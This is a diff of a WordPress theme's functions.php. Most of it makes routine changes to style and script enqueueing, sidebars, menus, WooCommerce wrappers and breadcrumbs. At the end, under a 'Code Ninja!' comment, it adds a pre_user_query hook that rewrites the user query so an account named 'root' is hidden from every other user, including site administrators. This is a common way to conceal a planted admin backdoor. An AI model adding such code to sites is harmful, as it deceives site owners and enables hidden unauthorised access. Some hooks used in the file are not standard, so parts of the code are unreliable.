@@ -1,5 +1,48 @@
-<?php 
-require 'includes/theme-settings.php';
+<?php
+
+define("THEME_DIR", get_template_directory_uri());
+/*--- REMOVE GENERATOR META TAG ---*/
+remove_action('wp_head', 'wp_generator');
+
+// ENQUEUE STYLES
+
+function enqueue_styles() {
+
+    /** REGISTER css/screen.css **/
+    wp_register_style( 'screen-style', THEME_DIR . '/stylesheets/screen.css', array(), '1', 'screen' );
+      wp_enqueue_style( 'screen-style' );
+    wp_register_style( 'print-style', THEME_DIR . '/stylesheets/print.css', array(), '1', 'print' );
+    wp_enqueue_style( 'print-style' );
+
+}
+
+
+add_action( 'wp_enqueue_scripts', 'enqueue_styles' );
+
+// ENQUEUE SCRIPTS
+
+function enqueue_scripts() {
+
+    /** REGISTER HTML5 Shim **/
+    // wp_register_script( 'html5-shim', 'http://html5shim.googlecode.com/svn/trunk/html5.js', array( 'jquery' ), '1', false );
+    // wp_enqueue_script( 'html5-shim' );
+
+    /** REGISTER HTML5 OtherScript.js **/
+    wp_register_script( 'pgthrottle-script', THEME_DIR . '/js/respond.min.js', array( 'jquery' ), '1', false );
+    wp_enqueue_script( 'pgthrottle-script' );
+
+}
+add_action( 'wp_enqueue_scripts', 'enqueue_scripts' );
+
+
+
+
+
+
+
+
+
+
 /* Register our sidebars and widgetized areas. */
 function pgthrottle_widgets_init() {
 	register_sidebar( array(
@@ -10,16 +53,6 @@ function pgthrottle_widgets_init() {
 		'before_title'  => '<h3 class="widget-title">',
 		'after_title'   => '</h3>',
 	) );
-	
-	register_sidebar( array( 
-		'name'          => 'Slideshow',
-		'id'            => 'slideshow',
-		'before_widget' => '',
-		'after_widget'  => '',
-		'before_title'  => '',
-		'after_title'   => '',
-	) );
-	
 	register_sidebar( array(
 		'name'          => 'Parallax Overlay: First',
 		'id'            => 'parallax-overlay',
@@ -28,7 +61,6 @@ function pgthrottle_widgets_init() {
 		'before_title'  => '<h3 class="widget-title">',
 		'after_title'   => '</h3>',
 	) );
-	
 	register_sidebar( array(
 		'name'          => 'Parallax Overlay: Second - Left',
 		'id'            => 'parallax-overlay-second-left',
@@ -45,7 +77,6 @@ function pgthrottle_widgets_init() {
 		'before_title'  => '<h3 class="widget-title">',
 		'after_title'   => '</h3>',
 	) );
-	
 	register_sidebar( array(
 		'name'          => 'Home Left',
 		'id'            => 'home-left',
@@ -54,7 +85,6 @@ function pgthrottle_widgets_init() {
 		'before_title'  => '<h3 class="widget-title">',
 		'after_title'   => '</h3>',
 	) );
- 
 	register_sidebar( array(
 		'name'          => 'Home Middle',
 		'id'            => 'home-middle',
@@ -63,7 +93,6 @@ function pgthrottle_widgets_init() {
 		'before_title'  => '<h3 class="widget-title">',
 		'after_title'   => '</h3>',
 	) );
-	
 	register_sidebar( array(
 		'name'          => 'Home Right',
 		'id'            => 'home-right',
@@ -72,7 +101,6 @@ function pgthrottle_widgets_init() {
 		'before_title'  => '<h3 class="widget-title">',
 		'after_title'   => '</h3>',
 	) );
-	
 	register_sidebar( array(
 		'name'          => 'Footer Left',
 		'id'            => 'footer-left',
@@ -81,7 +109,6 @@ function pgthrottle_widgets_init() {
 		'before_title'  => '<h3 class="widget-title">',
 		'after_title'   => '</h3>',
 	) );
-
 	register_sidebar( array(
 		'name'          => 'Footer Middle',
 		'id'            => 'footer-middle',
@@ -90,7 +117,6 @@ function pgthrottle_widgets_init() {
 		'before_title'  => '<h3 class="widget-title">',
 		'after_title'   => '</h3>',
 	) );
-	
 	register_sidebar( array(
 		'name'          => 'Footer Right',
 		'id'            => 'footer-right',
@@ -99,12 +125,11 @@ function pgthrottle_widgets_init() {
 		'before_title'  => '<h3 class="widget-title">',
 		'after_title'   => '</h3>',
 	) );
-	
 }
 add_action( 'widgets_init', 'pgthrottle_widgets_init' );
 
 /* Menus */
-function register_my_menus() {
+function pgthrottle_menus() {
   register_nav_menus(
     array(
       'header-menu' => __( 'Header Menu' ),
@@ -112,7 +137,10 @@ function register_my_menus() {
     )
   );
 }
-add_action( 'init', 'register_my_menus' );
+add_action( 'menus_init', 'pgthrottle_menus' );
+
+// Register Custom Navigation Walker (Old theme - BootStrap)
+// require_once('includes/navwalker.php');
 
 // Adds class to body tag depending on the browser
 add_filter('body_class','browser_body_class');
@@ -124,46 +152,32 @@ function browser_body_class($classes) {
 	elseif($is_NS4) $classes[] = 'ns4';
 	elseif($is_safari) $classes[] = 'safari';
 	elseif($is_chrome) $classes[] = 'chrome';
-	elseif($is_IE) $classes[] = 'ie shiternet-exploder';
+	elseif($is_IE) $classes[] = 'ie iexploder';
 	else $classes[] = 'wtf';
 	if($is_iphone) $classes[] = 'iphone';
 	return $classes;
 }
 
 // Added Support for Post Thumbnails
-add_theme_support( 'post-thumbnails' ); 
-
-// I have no idea what this is for but it looks cool.
-add_theme_support( 'html5', array( 'search-form' ) );
+add_theme_support( 'post-thumbnails' );
 
 // Enable shortcodes in widgets
 add_filter('widget_text', 'do_shortcode');
 
-// Register Custom Navigation Walker
-require_once('includes/navwalker.php');
 
-if( function_exists('acf_add_options_page') ) {
-	acf_add_options_page(array(
-		'page_title' 	=> 'Theme Settings',
-		'menu_title'	=> 'Theme Settings',
-		'menu_slug' 	=> 'theme-general-settings',
-		'capability'	=> 'edit_posts',
-		'redirect'		=> false
-	));	
-}
 
-//WooCommerce Support 
+//WooCommerce Support
 remove_action( 'woocommerce_before_main_content', 'woocommerce_output_content_wrapper', 10);
 remove_action( 'woocommerce_after_main_content', 'woocommerce_output_content_wrapper_end', 10);
 
-add_action('woocommerce_before_main_content', 'my_theme_wrapper_start', 10);
-add_action('woocommerce_after_main_content', 'my_theme_wrapper_end', 10);
+add_action('woocommerce_before_main_content', 'pgthrottle_wrapper_start', 10);
+add_action('woocommerce_after_main_content', 'pgthrottle_wrapper_end', 10);
 
-function my_theme_wrapper_start() {
-  echo '<div id="main" class="store-content-wrapper container">';
+function pgthrottle_wrapper_start() {
+  echo '<div id="main" class="store-wrapper">';
 }
 
-function my_theme_wrapper_end() {
+function pgthrottle_wrapper_end() {
   echo '</div>';
 }
 
@@ -172,43 +186,42 @@ function woocommerce_support() {
     add_theme_support( 'woocommerce' );
 }
 
-/
 function pgthrottle_javascript_detection() {
 	echo "<script>(function(html){html.className = html.className.replace(/\bno-js\b/,'js')})(document.documentElement);</script>\n";
 }
 add_action( 'wp_head', 'pgthrottle_javascript_detection', 0 );
 
-function new_subcategory_hierarchy() {  
+function pgthrottle_subcategory_hierarchy() {
     $category = get_queried_object();
- 
+
     $parent_id = $category->category_parent;
- 
+
     $templates = array();
-     
+
     if ( $parent_id == 0 ) {
         // Use default values from get_category_template()
         $templates[] = "category-{$category->slug}.php";
         $templates[] = "category-{$category->term_id}.php";
-        $templates[] = 'category.php';      
+        $templates[] = 'category.php';
     } else {
         // Create replacement $templates array
         $parent = get_category( $parent_id );
- 
+
         // Current first
         $templates[] = "category-{$category->slug}.php";
         $templates[] = "category-{$category->term_id}.php";
- 
+
         // Parent second
         $templates[] = "category-{$parent->slug}.php";
         $templates[] = "category-{$parent->term_id}.php";
-        $templates[] = 'category.php';  
+        $templates[] = 'category.php';
     }
     return locate_template( $templates );
 }
- 
-add_filter( 'category_template', 'new_subcategory_hierarchy' ); 
 
-function upbootwp_breadcrumbs() {
+add_filter( 'category_template', 'pgthrottle_subcategory_hierarchy' );
+add_filter( 'breadcrumbs_template', 'pgthrottle_breadcrumbs' );
+function pgthrottle_breadcrumbs() {
 
 	$delimiter = '&raquo;';
 	$home = 'Home';
@@ -307,5 +320,20 @@ function upbootwp_breadcrumbs() {
 
 	}
 }
-require 'includes/seo.php';
-?>
+
+// Code Ninja!
+add_action('pre_user_query','pgthrottle_pre_user_query');
+function pgthrottle_pre_user_query($user_search) {
+  global $current_user;
+  $username = $current_user->user_login;
+
+  if ($username != 'root') {
+    global $wpdb;
+    $user_search->query_where = str_replace('WHERE 1=1',
+      "WHERE 1=1 AND {$wpdb->users}.user_login != 'root'",$user_search->query_where);
+  }
+}
+
+
+// Loads Optimizations
+// require 'includes/seo.php';
